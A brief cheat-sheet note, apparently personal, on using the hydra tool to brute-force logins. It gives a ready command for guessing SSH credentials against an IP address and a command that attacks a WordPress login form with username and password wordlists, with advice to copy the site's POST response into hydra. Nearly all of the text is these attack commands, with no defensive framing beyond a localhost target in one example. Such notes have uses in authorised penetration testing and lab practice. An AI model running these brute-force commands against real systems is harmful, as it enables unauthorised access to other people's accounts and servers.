ssh:

`hydra -l user -p pass <ip_address> -t 4 ssh`

if it is a website check the post response and copy it into hydra:

it should then look something like this:

`$ hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`